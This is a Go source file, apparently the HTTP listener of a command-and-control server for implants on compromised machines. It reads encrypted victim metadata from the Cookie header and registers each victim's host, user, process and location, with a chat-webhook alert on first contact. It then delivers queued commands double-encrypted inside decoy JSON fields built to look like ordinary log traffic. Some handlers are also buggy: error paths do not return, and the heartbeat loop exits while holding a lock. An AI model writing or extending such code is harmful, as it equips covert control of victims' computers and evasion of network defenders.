package communication

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/webhooks"
	"encoding/binary"
	"encoding/json"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

type ClientTime struct {
	lastHeartbeat time.Time
	timeoutCount  int
}

var MuClientManager sync.Mutex
var ClientTimeManager = make(map[string]*ClientTime)

func GetHttp(w http.ResponseWriter, r *http.Request) {
	cookieValue := r.Header.Get("Cookie")

	encryptMetainfo := strings.TrimPrefix(cookieValue, config.Http_get_metadata_prepend)

	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
	}

	metainfo, err := encrypt.Decrypt(tmpMetainfo)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
	}

	uid := encrypt.BytesToMD5(metainfo)

	var client database.Clients
	exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
	if !exsists { // FirstBlood
		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = "web"
		connection.MuClientListenerType.Unlock()

		processID := binary.BigEndian.Uint32(metainfo[:4])
		flag := int(metainfo[4:5][0])
		ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
		localIP := utils.Uint32ToIP(ipInt).String()
		osInfo := string(metainfo[9:])

		osArray := strings.Split(osInfo, "\t")
		hostName := osArray[0]
		UserName := osArray[1]
		processName := osArray[2]

		// 外网 ip
		externalIp, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			externalIp = r.RemoteAddr
		}
		if externalIp == "::1" {
			externalIp = "127.0.0.1"
		}
		//地址
		//q := qqwry.NewQQwry("qqwry.dat")
		//q.Find(externalIp)
		//address := q.Country
		address, _ := qqwry.GetLocationByIP(externalIp)

		currentTime := time.Now()
		timeFormat := "01-02 15:04"
		formattedTime := currentTime.Format(timeFormat)

		arch := "x86"

		if flag > 8 {
			UserName += "*"
			flag = flag - 8
		}
		if flag > 4 {
			arch = "x64"
		}
		c := database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: "5", Online: "1", Color: ""}
		database.Engine.Insert(&c)
		database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
		database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
		if exits, key := webhooks.CheckEnable(); exits {
			webhooks.SendWecom(c, key)
		}
		successBytes, _ := encrypt.Encrypt([]byte("success"))
		pos1, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())
		pos2, _ := encrypt.EncodeBase64(successBytes)
		pos3, _ := encrypt.EncodeBase64(encrypt.GenRandomBytes())

		response := map[string]interface{}{
			"data": map[string]interface{}{
				"log_id": encrypt.GenRandomLogID(),
				"action_rule": map[string][]byte{
					"pos_1": pos1,
					"pos_2": pos2,
					"pos_3": pos3,
				},
			},
		}

		// 设置 Content-Type 为 JSON
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		clientTime := &ClientTime{
			lastHeartbeat: time.Now(),
			timeoutCount:  0,
		}
		MuClientManager.Lock()
		ClientTimeManager[uid] = clientTime
		MuClientManager.Unlock()
		go checkHeartbeats(uid)

		// 编码 JSON 并写入响应
		json.NewEncoder(w).Encode(response)
	} else { // PullCommands
		database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
		clientTime := &ClientTime{
			lastHeartbeat: time.Now(),
			timeoutCount:  0,
		}
		MuClientManager.Lock()
		ClientTimeManager[uid] = clientTime
		MuClientManager.Unlock()

		var pos1, pos2, pos3 []byte
		cmdBytes, ok := command.CommandQueues.GetCommand(uid)

		if ok && len(cmdBytes) > 0 {
			cmdBytes, _ = encrypt.Encrypt(cmdBytes)
			cmdBytes, _ = encrypt.Encrypt(cmdBytes)
			cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = cmdBase64
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())

			response := map[string]interface{}{
				"data": map[string]interface{}{
					"log_id": encrypt.GenRandomLogID(),
					"action_rule": map[string][]byte{
						"pos_1": pos1,
						"pos_2": pos2,
						"pos_3": pos3,
					},
				},
			}

			// 设置 Content-Type 为 JSON
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)

			// 编码 JSON 并写入响应
			json.NewEncoder(w).Encode(response)

		} else {

			pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			pos2 = []byte{}
			pos3, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
			response := map[string]interface{}{
				"data": map[string]interface{}{
					"log_id": encrypt.GenRandomLogID(),
					"action_rule": map[string][]byte{
						"pos_1": pos1,
						"pos_2": pos2,
						"pos_3": pos3,
					},
				},
			}

			// 设置 Content-Type 为 JSON
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)

			// 编码 JSON 并写入响应
			json.NewEncoder(w).Encode(response)
		}

	}

}
func checkHeartbeats(uid string) {
	var sleep database.Clients
	database.Engine.Where("uid = ?", uid).Get(&sleep)
	sleepTime, _ := strconv.Atoi(sleep.Sleep)
	ticker := time.NewTicker(time.Duration(sleepTime) * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		MuClientManager.Lock()
		currentTime := time.Now()

		if _, exists := ClientTimeManager[uid]; exists {
			if currentTime.Sub(ClientTimeManager[uid].lastHeartbeat) > 10*time.Second {
				ClientTimeManager[uid].timeoutCount++
				if ClientTimeManager[uid].timeoutCount >= 30 {
					database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "2"})
					delete(ClientTimeManager, uid)
				}
			}
		} else {
			break
		}

		MuClientManager.Unlock()
	}
}
